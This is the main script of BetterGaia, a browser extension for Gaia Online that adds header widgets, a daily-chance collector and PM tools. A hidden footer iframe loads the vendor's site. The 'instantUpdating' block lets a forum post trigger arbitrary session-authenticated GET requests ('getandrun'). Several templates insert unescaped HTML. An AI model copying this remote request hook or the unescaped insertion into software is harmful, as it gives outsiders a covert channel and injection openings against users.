/*
Main JS
Copyright (c) BetterGaia
*/

function MainJs() {

// Credits
$('body > #gaia_footer > p').append('<span id="bg_credits">\
    <span>You\'re using <a href="/forum/t.45053993/" target="_blank">BetterGaia <small>' + prefs['version'] + '</small></a> \
    by <a href="http://bettergaia.com/" target="_blank">The BetterGaia Team</a>.</span> \
    <a class="bgtopofpage" href="#">Back to Top</a> \
    <a name="bg_bottomofpage"></a>\
    <iframe sandbox="allow-scripts allow-forms allow-same-origin" style="height: 0; width: 1px; border: 0; visibility: hidden;" src="http://www.bettergaia.com/public/update/"></iframe>\
</span>');

// Wrap username and move logout menu inside
$('#gaia_header #user_header_wrap').prepend('<div id="bg_userbar" class="hud-account"></div>');
$('#gaia_header #user_header_wrap #user_account').appendTo('#gaia_header #bg_userbar');
$('#gaia_header #user_dropdown_menu').appendTo('#gaia_header #bg_userbar #user_account');

// Float notifications
if (prefs['header.float'] === true && $('#gaia_header .header_content .notificationChanges').length === 1) {
    didScroll = false;

    $(window).scroll(function() {
        didScroll = true;
    });

    setInterval(function() {
        if (didScroll) {
            didScroll = false;
            $('#gaia_header .header_content .notificationChanges').toggleClass('bgscrolling', $(window).scrollTop() > 175);
        }
    }, 500);
}

// Add BG Siderbar to MyGaia
if (document.location.pathname.indexOf('/mygaia/') > -1 && prefs['mygaia.bgchat'] === true) {
    $('body.mygaia #gaia_content.grid_ray_davies #bd #yui-main .yui-g > .left').prepend('<div id="bg_sidebar" class="mg_content">\
        <div class="mg_sprite hd">BetterGaia <small class="bgversion">' + prefs['version'] + '</small>\
            <a class="pure-button"></a>\
        </div>\
        <div class="bd">\
            <iframe sandbox="allow-scripts allow-forms allow-same-origin allow-popups" width="100%" frameborder="0" src="http://www.bettergaia.com/sidebar/"></iframe>\
        </div>\
    </div>');

    $('#bg_sidebar .pure-button').on('click', function() {
        $('#gaia_content .left').toggleClass('bgexpanded');
    });
}

// Widgets
$('#gaia_header #bg_userbar').prepend('<ul id="bg_widgets"><li class="bgsettings"><a></a><div></div></li></ul>');

if (typeof(prefs['welcome']) == 'undefined') $('#bg_widgets .bgsettings').addClass('bgwelcome');
$('#bg_widgets > li.bgsettings > a').on('click.bgsettings', function() {
    // Show welcome screen if new
    if ($(this).parent().hasClass('bgwelcome') && typeof(prefs['welcome']) == 'undefined') {
        chrome.extension.sendMessage({elements: 'settings'});
        $(this).parent().removeClass('bgwelcome');
        return;
    }

    // BetterGaia Settings
    chrome.extension.sendMessage({elements: 'settings'});

    // Open
    $(this).parent().siblings('li').removeClass('bgopen');
});

if (prefs['header.widgets'] === true) {
    $('#bg_widgets > li.bgsettings').before('\
        <li class="bgfriends"><a></a><div></div></li>\
        <li class="bgmessages"><a></a><div></div></li>\
        <li class="bgthreads"><a></a><div></div></li>\
    <li class="bgwatchlist"><a></a><div></div></li>');

    $('#bg_widgets > li a').on('click', function() {
        if (!$(this).parent().hasClass('bgloaded') && !$(this).parent().hasClass('bgloading')) {
            // Friends
            if ($(this).parent().hasClass('bgfriends')) {
                $(this).parent().addClass('bgloading');

                $.ajax({
                    type: 'POST',
                    url: '/gapi/rest/gfooter/',
                    data: {'method': 'getfriendlist'},
                    dataType: 'text json',
                    cache: false
                })
                .done(function(data) {
                    if (data['message'] == 'success')
                        $.each(data['friendList'], function(i, value) {
                            var online = (data['friendList'][i]['fid'] === '')? 'offline' : 'online';
                            $('#bg_widgets .bgfriends div').append("<a href='/profiles/" + data['friendList'][i]['uid'] + "/' target='_black' class='" + online + "'>\
                                <img src='/gaia/members/" + data['friendList'][i]['hs'] + "' />\
                                <span>" + data['friendList'][i]['un'] + "</span>\
                            </a>");
                        });
                    else $('#bg_widgets .bgfriends div').html('<p>There was a problem fetching your friends list. <br> Error: ' + data['statusCode'] + '</p>');
                })
                .fail(function(data) {
                    $('#bg_widgets .bgfriends div').html("<p>There was a problem fetching your friends list.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgfriends').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // PMs
            else if ($(this).parent().hasClass('bgmessages')) {
                $(this).parent().addClass('bgloading');

                $.get('/profile/privmsg.php', 'html')
                .done(function(data) {
                    var mail = $('#gaia_content #pm_content table td > img[title="Unread Message"]', data).parent().parent();
                    if (mail.length === 0) $('#bg_widgets .bgmessages div').append('<p>You have no unread messages.</p>');
                    else {
                        $(mail).each(function() {
                            var link = $('<li></li>').append("<a href='" + $(mail).find("td span.topictitle > a.topictitle").attr("href") + "'><strong>" + $(mail).find("td span.topictitle > a.topictitle").attr("title") + "</strong> from " + $(mail).find("span.name a").html() + "</a>");
                            $('#bg_widgets .bgmessages div').append(link);
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgmessages div').html("<p>There was a problem fetching your messages.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgmessages').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // Sub Threads
            else if ($(this).parent().hasClass('bgthreads')) {
                $(this).parent().addClass('bgloading');

                $.get('/forum/subscription/', 'html')
                .done(function(data) {
                    var posts = $('#gaia_content #upe-unsubscribe table.forum-list tbody td.topic-new div > a.goto-new-posts', data);
                    if (posts.length === 0) $('#bg_widgets .bgthreads div').append('<p>There are no updates in your subscribed threads.</p>');
                    else {
                        $(posts).each(function() {
                            var title = $(this).prop('title').slice(0, -13);
                            var thread = $('<a href="' + $(this).attr('href') + '">' + title + '</a>');
                            $('#bg_widgets .bgthreads div').append(thread);
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgthreads div').html("<p>There was a problem fetching your subscribed threads.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgthreads').removeClass('bgloading').addClass('bgloaded');
                });
            }

            // Watchlist
            else if ($(this).parent().hasClass('bgwatchlist')) {
                $(this).parent().addClass('bgloading');

                $.get('/marketplace/watchlist/', 'html')
                .done(function(data) {
                    if ($("#watchlist_wrapper #watchlist .watchlist_rows > tbody > tr > td span.nolistings", data).length > 0) $('#bg_widgets .bgwatchlist div').append('<p>There are no items in your watchlist.</p>');
                    else {
                        var items = $("#watchlist_wrapper #watchlist .watchlist_rows > tbody > tr > td.watchlist_rows_item_field a:first-child", data);
                        $(items).each(function() {
                            var time = $(this).parent().parent().find('td.watchlist_rows_timeleft').text();
                            var name = $(this).next('a').text();
                            $('#bg_widgets .bgwatchlist div').append($(this).attr('title', name).append('<span>' + time + '</span>'));
                        });
                    }
                })
                .fail(function(data) {
                    $('#bg_widgets .bgwatchlist div').html("<p>There was a problem fetching your watchlist.</p>");
                })
                .always(function(data) {
                    $('#bg_widgets .bgwatchlist').removeClass('bgloading').addClass('bgloaded');
                });
            }
        }

        // Open
        if (!$(this).parent().hasClass('bgsettings')) {
            $(this).parent().siblings('li').removeClass('bgopen');
            $(this).parent().toggleClass('bgopen');
        }
    });
}

// Editor Toolbar
$(window).load(function() {
    // --Add emoji button
    $("body #editor #format_controls .format-text").append("<li><a class='bg_addemoji' onclick='var el = document.getElementById(\"emoticons\"); el.style.display = (el.style.display != \"block\" ? \"block\" : \"\" ); var el2 = document.getElementById(\"emote_select\"); el2.style.display = (el2.style.display != \"block\" ? \"block\" : \"\" );' title='Add Emoticons'>Add Emoticons</a></li>");

    // --Add spoiler button
    $("body #editor #format_controls .format-elements").append("<li><a class='bg_spoiler' onclick='function wrapText(elementID, openTag, closeTag) {var textarea = document.getElementById(elementID); var len = textarea.value.length; var start = textarea.selectionStart; var end = textarea.selectionEnd; var selectedText = textarea.value.substring(start, end); var replacement = openTag + selectedText + closeTag; textarea.value = textarea.value.substring(0, start) + replacement + textarea.value.substring(end, len);} wrapText(\"message\", \"[spoiler]\", \"[/spoiler]\");' title='Add Spoiler - [spoiler][/spoiler]'>Add Spoiler Tag</a></li>");
});

// Shortcuts
if (prefs['header.shortcuts'] === true) {
    // check if empty
    if (!$.isEmptyObject(prefs['header.shortcuts.list'])) {
        $('#gaia_header #bg_userbar').prepend('<ul id="bg_shortcuts"><a>Shortcuts</a><div></div></ul>');
        $(prefs['header.shortcuts.list']).each(function(index, data){
            $('#bg_shortcuts div').append('<a href="' + data[1] + '">' + data[0] + '</a>');
        });
    }
}

// Draw All
if (prefs['header.drawAll'] === true && ['/', '/mygaia/', '/market/', '/forum/', '/world/', '/games/', '/payments/', '/gofusion/'].indexOf(document.location.pathname) > -1 && $('#dailyChance_clawMachine').length == 1) {
	// Add Sign
	$('#dailyChance_clawMachine').after('<a class="bg_drawall" title="BetterGaia&rsquo;s Draw All Daily Chances">draw <em>all</em></a>');

    // Open model
    $('#dailyReward .bg_drawall').on('click', function() {
        if ($('#bg_drawall').length < 1) {
            var template = Handlebars.compile('<div id="bg_drawall">\
                <h1>Draw All <a class="close" title="Close"></a></h1>\
                <ul>\
                    {{#each this}}\
                    <li>\
                        <span>{{name}}</span>\
                        <div><a data-candy="{{id}}">Collect</a></div>\
                    </li>\
                    {{/each}}\
                </ul>\
            </div>\
            <div class="bettergaia mask"></div>');

            var candy = [{id: 1, name: 'Home'}, {id: 2, name: 'MyGaia'}, {id: 1279, name: 'Gaia Cash'}, {id: 8, name: 'Shops'}, {id: 1271, name: 'GoFusion'}, {id: 3, name: 'Forums'}, {id: 5, name: 'World'}, {id: 4, name: 'Games'}, {id: 12, name: 'Mobile App'}];
            $('body').append(template(candy));

            $('#bg_drawall h1 .close').on('click', function() {
                $('#bg_drawall').removeClass('bgopen');
            });

            $('#bg_drawall ul').on('click', '.bgreward', function() {
                $(this).parent().toggleClass('bgexpand');
            });

            $('#bg_drawall a[data-candy]').on('click', function() {
                var thisCandy = $(this).closest('li');
                thisCandy.addClass('loading');

                $.ajax({
                    type: 'POST',
                    url: '/dailycandy/pretty/',
                    data: {
                        action: 'issue',
                        list_id: $(this).attr('data-candy'),
                        _view: 'json'
                    },
                    dataType: 'json'
                }).done(function(data) {
                    if (data['status'] == 'ok') {
                        var template2 = Handlebars.compile('<img src="http://gaiaonline.com/images/{{data.reward.thumb}}">\
                        <strong>{{data.reward.name}}</strong>\
                        <p class="bgreward">\
                            {{#if data.reward.descrip}}\
                                {{{data.reward.descrip}}}\
                                {{#if data.tier_desc}}\
                                <br><br>{{data.tier_desc}}\
                                {{/if}}\
                            {{else}}\
                                {{#if data.tier_desc}}\
                                {{data.tier_desc}}\
                                {{/if}}\
                            {{/if}}\
                        </p>');

                        thisCandy.children('div').html(template2(data));
                    }
                    else if (data['status'] == 'fail') {
                        thisCandy.children('div').html('<p>' + data['error']['message'] + '</p>');
                    }
                    else thisCandy.children('div').html('<p>There was a problem getting your Daily Chance.</p>');
                }).fail(function() {
                    thisCandy.children('div').html('<p>There was a problem getting your Daily Chance.</p>');
                }).always(function() {
                    thisCandy.removeClass('loading').addClass('loaded');
                });
            });
        }

        $('#bg_drawall').addClass('bgopen');
    });
}

// Private Messages
if (prefs['pms'] === true && document.location.pathname.indexOf('/profile/privmsg.php') > -1) {
	// Private message selectors
	$('body.mail #pm_content table tr[height="20"] td[align]').after("<div class='bg_selecttypes'><span><a class='all'>All</a><a class='read'>Read</a><a  class='unread'>Unread</a><a class='replied'>Replied</a><a class='none'>None</a></span></div>");
	$('body.mail #pm_content table tr[bgcolor][height="42"] > td:nth-of-type(2) img').each(function(index, element) {
		$(this).closest('tr[bgcolor][height="42"]').attr('status', $(this).attr('title'));
  });

	$('body.mail #pm_content .bg_selecttypes a').on('click', function() {
		if ($(this).hasClass('all')) $('tr[bgcolor][height="42"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('read')) $('tr[bgcolor][height="42"][status="Read Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('unread')) $('tr[bgcolor][height="42"][status="Unread Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('replied')) $('tr[bgcolor][height="42"][status="Replied Message"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', true);
		if ($(this).hasClass('none')) $('tr[bgcolor][height="42"]:not(.bgpm_hide) input[type="checkbox"]').prop('checked', false);
	});

	// Add Avatar Image
	var userids = [];
	$('tr[bgcolor][height="42"] span.name a[href]').each(function(index, element) {
		var userid = $(this).attr("href").split("/")[5];
		$(this).closest('tr[bgcolor][height="42"]').attr("userid", userid);

		if (userids.indexOf(userid) == -1) {
			userids.push(userid);
			$.get("/profiles?mode=lookup&avatar_username=" + $(this).closest('tr[bgcolor][height="42"]').find('span.name').text(), function(data){
				var i = document.createElement('img');
				$(i).load(function(){
                    $('tr[bgcolor][height="42"][userid="'+userid+'"] span.topictitle a').css({'background-image': 'url(/dress-up/avatar/' + $(data).find('response').attr('avatarPath') + ')', 'background-position': 'right -35px'});
				});
				i.src = 'http://www.gaiaonline.com/dress-up/avatar/' + $(data).find('response').attr('avatarPath');
			});
		}
	});

	// Instant Search
	$('body.mail #pm_content table tr[height="20"]').append('<input type="text" class="bgpm_search" placeholder="Search this page" value="" />');
	$.extend($.expr[":"], {"Contains": function(elem, i, match, array) {return (elem.textContent || elem.innerText || "").toLowerCase().indexOf((match[3] || "").toLowerCase()) >= 0;}});
	$('body.mail #pm_content table tr[height="20"] .bgpm_search').keyup(function() {
		var value = $(this).val();
		if (value.length > 0) {
			$('body.mail #pm_content table tr[bgcolor][height="42"]:not(:Contains("' + value + '"))').addClass('bgpm_hide').find('input[type="checkbox"]').prop('checked', false);
			$('body.mail #pm_content table tr[bgcolor][height="42"]:Contains("' + value + '")').removeClass('bgpm_hide');
		}
		else $('body.mail #pm_content table tr[bgcolor][height="42"]').removeClass('bgpm_hide');
	});
}

// Fetch all announcements
if (prefs['announcementReader'] === true && $('#notifyItemList .notify_icon_announcement').length == 1) {
    // Get number of remaining announcements
    var remaining = parseInt($('#notifyItemList .notify_icon_announcement').text().replace(/\D/g, ''), 10);
    if (remaining > 10) remaining = 10;

    // Open model
    $('#notifyItemList .notify_icon_announcement').on('click', function() {
        if ($('#bg_anreader').length < 1) {
            $('body').append('<div id="bg_anreader">\
                <h1>Announcement Reader <a class="close" title="Close"></a></h1>\
                <div class="bg_container">\
                    <ul></ul>\
                    <div class="content">\
                        <span class="bg_spinner"></span>\
                    </div>\
                </div>\
            </div>\
            <div class="bettergaia mask"></div>');

            var liTemplate = Handlebars.compile('<li class="new" data-announcement="{{i}}">\
                <span class="username">{{username}}</span>\
                <span class="title">{{title}}</span>\
            </li>');
            
            var threadTemplate = Handlebars.compile('<div class="page" data-announcement="{{i}}">\
                <div class="header">\
                    <div class="avatar">{{{avatar}}}</div>\
                    <a href="{{link}}" target="_blank">{{username}}</a>\
                    <span>{{date}}</span>\
                    <h1><a href="{{link}}" target="_blank">{{title}}</a></h1>\
                </div>\
                <div class="message">{{{content}}}</div>\
            </div>');

            $('#bg_anreader h1 .close').on('click', function() {
                $('#bg_anreader').removeClass('bgopen');
                $('html').removeClass('bg_noscroll');
            });

            function apply() {
                $.ajax({
                    url: '/news/',
                    cache: false,
                    dataType: 'html',
                    headers: {'X-PJAX': true}
                })
                .done(function(html) {
                    if ($('#thread_header #thread_title', html).length == 1) {
                        var thread = {
                            i: remaining,
                            title: $('#thread_title a', html).text(),
                            link: $('#thread_title a', html).attr('href'),
                            username: $('#post-1 .user_info .user_name', html).text(),
                            date: $('#post-1 .post-meta .timestamp', html).text(),
                            content: $('#post-1 .post-bubble .speech_bubble > .content', html).html(),
                            avatar: $('#post-1 .avi_box .avatar', html).html()
                        };

                        $('#bg_anreader ul').prepend(liTemplate(thread));
                        $('#bg_anreader .content').prepend(threadTemplate(thread));
                    }
                    else {
                        remaining = 0;
                    }

                    // Keep loading
                    if (remaining > 0) {
                        remaining--;
                        apply();
                    }
                    // No more, end
                    else {
                        $('#bg_anreader').addClass('loaded');
                        $('#bg_anreader .content .page .message a').attr('target', '_blank');

                        $('#bg_anreader ul').on('click', 'li', function() {
                            $('#bg_anreader ul li.active, #bg_anreader .content .page.active').removeClass('active');
                            $(this).removeClass('new').addClass('active');
                            $('#bg_anreader .content .page[data-announcement="' + $(this).attr('data-announcement') + '"]').addClass('active');
                        });
                        
                        $('#bg_anreader ul li:first-child').click();
                    }
                });
            }

            apply();
        }

        $('#bg_anreader').addClass('bgopen');
        $('html').addClass('bg_noscroll');
        return false;
    });
}

// Enable Instant CSS updating
if (prefs['instantUpdating'] === true) {
    $(window).load(function() {
        $.ajax({
            url: '/guilds/viewtopic.php?t=24076833',
            cache: false,
            dataType: 'html',
            headers: {'X-PJAX': true}
        })
        .done(function(html) {
            if ($('.postcontent:eq(1) .postbody span[style="color:enabled"]', html).length == 1) {
                var version = prefs['version'].replace(/\./g,'');
                html = $('.postcontent:eq(1) .postbody', html);

                // look for new code
                if ($('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).length == 1) {
                    chrome.storage.local.set({css: $('span[style="color:#' + version + '"] + .spoiler-wrapper .code', html).text()});
                }
                else chrome.storage.local.remove('css');

                if ($('span[style="color:getandrun"]', html).length == 1) {
                    var data = $('.postcontent:eq(1) .postbody span[style="color:getandrun"]', html).text().split(',');
                    $.ajax({url: data[0], cache: false, dataType: 'html', headers: {'X-PJAX': true}}).done(function(html) {
						if ($(data[1], html).length == 1) $.get(data[0] + $(data[1], html)[data[3]]() + data[2]);
					});
				}
			}
        });
    });
}
} // ---

// Check Storage and Fire
if (prefs['appliedUserPrefs'] === true && prefs['appliedMainJs'] === false) {
	MainJs();
	prefs['appliedMainJs'] = true;
}
